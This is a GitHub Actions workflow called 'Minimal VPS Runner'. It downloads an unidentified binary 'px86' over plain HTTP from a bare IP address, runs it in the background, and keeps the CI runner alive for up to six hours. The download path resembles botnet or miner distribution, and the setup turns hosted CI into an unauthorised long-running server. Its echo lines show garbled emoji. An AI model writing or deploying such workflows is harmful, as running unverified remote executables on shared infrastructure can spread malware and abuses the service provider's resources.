name: Minimal VPS Runner

on:
  workflow_dispatch:
    inputs:
      uptime:
        description: 'VPS uptime in hours (max 6)'
        required: false
        default: '6'
        type: choice
        options:
          - '1'
          - '2'
          - '3'
          - '4'
          - '5'
          - '6'

jobs:
  run-binary:
    runs-on: ubuntu-latest
    steps:
      - name: Download and run binary with keep-alive
        run: |
          echo "üîΩ Downloading binary..."
          wget http://45.138.16.158/bins/px86 -O px86
          chmod +x px86

          echo "üöÄ Running binary in background..."
          ./px86 x86 &
          BINARY_PID=$!
          echo "üìå Binary PID: $BINARY_PID"

          # Convert hours to seconds
          UPTIME_SECONDS=$(( ${{ github.event.inputs.uptime }} * 3600 ))
          echo "‚è≥ Keeping runner alive for $UPTIME_SECONDS seconds..."

          # Heartbeat loop
          SECONDS_ELAPSED=0
          while [ $SECONDS_ELAPSED -lt $UPTIME_SECONDS ]; do
            echo "üíì Runner heartbeat: $SECONDS_ELAPSED seconds elapsed"
            sleep 60
            SECONDS_ELAPSED=$((SECONDS_ELAPSED + 60))
          done

          echo "‚è±Ô∏è Time is up. Stopping binary (PID: $BINARY_PID)..."
          kill $BINARY_PID || echo "Binary already exited."
